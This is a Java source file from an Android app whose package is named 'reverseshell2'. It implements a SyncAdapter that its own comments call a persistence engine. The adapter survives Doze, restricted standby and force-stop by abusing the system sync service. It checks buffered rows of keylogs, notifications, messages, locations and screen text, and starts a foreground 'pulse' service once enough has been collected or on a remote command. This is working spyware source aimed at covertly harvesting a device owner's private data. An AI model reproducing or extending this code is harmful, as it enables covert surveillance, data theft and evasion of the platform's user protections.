package com.example.reverseshell2;

import android.accounts.Account;
import android.content.AbstractThreadedSyncAdapter;
import android.content.ContentProviderClient;
import android.content.Context;
import android.content.Intent;
import android.content.SyncResult;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;

/**
 * SyncAdapter — the core persistence engine.
 * 
 * This replaces WorkManager as the PRIMARY sync mechanism.
 * Android's SyncManager (system_server process) will wake our app
 * process to call onPerformSync() even from:
 *   - Doze mode
 *   - App Standby "Restricted" bucket
 *   - After force-stop (if periodic sync is registered)
 * 
 * The OS treats this with the same priority as Google Account sync.
 */
public class SyncAdapterImpl extends AbstractThreadedSyncAdapter {

    private static final String TAG = "SYS_SYNC_ADAPTER";

    public SyncAdapterImpl(Context context, boolean autoInitialize) {
        super(context, autoInitialize);
    }

    public SyncAdapterImpl(Context context, boolean autoInitialize, boolean allowParallelSyncs) {
        super(context, autoInitialize, allowParallelSyncs);
    }

    @Override
    public void onPerformSync(Account account, Bundle extras, String authority,
                              ContentProviderClient provider, SyncResult syncResult) {
        Log.d(TAG, "SyncAdapter check triggered — evaluating pulse necessity");
        
        try {
            Context context = getContext();
            DataStore store = DataStore.getInstance(context);
            
            // EVALUATION LOGIC: Should we pulse?
            long unsyncedRows = 0;
            String[] tables = {"keylogs", "notifications", "messages", "locations", "screen_texts"};
            for (String table : tables) {
                unsyncedRows += store.getUnsyncedCount(table);
            }

            // PULSE CRITERIA:
            // 1. Buffer > 50 records (Heavy weight)
            // 2. Forced sync via extras (Manual command)
            boolean forceSync = extras.getBoolean("force_sync", false);

            if (unsyncedRows > 50 || forceSync) {
                Log.d(TAG, "Pulse required (Rows: " + unsyncedRows + ") — starting Brawn (FGS)");
                Intent pulseIntent = new Intent(context, mainService.class);
                pulseIntent.setAction("ACTION_START_PULSE");
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(pulseIntent);
                } else {
                    context.startService(pulseIntent);
                }
            } else {
                Log.d(TAG, "Pulse suppressed — buffer low (" + unsyncedRows + " rows). Preserving daily budget.");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "SyncAdapter evaluation failed: " + e.getMessage());
            syncResult.stats.numIoExceptions++;
        }
    }
}
